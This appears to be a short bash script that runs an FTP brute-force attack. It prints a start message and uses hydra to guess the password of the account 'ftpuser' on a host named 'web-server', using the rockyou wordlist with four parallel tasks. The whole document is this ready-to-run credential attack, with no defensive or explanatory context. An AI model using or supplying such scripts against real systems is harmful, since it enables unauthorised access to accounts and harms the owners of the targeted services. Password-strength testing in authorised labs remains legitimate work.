#!/bin/bash

# Simple FTP brute force script
echo "Starting FTP brute force attack against web-server on port 21"
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt.gz web-server ftp -t 4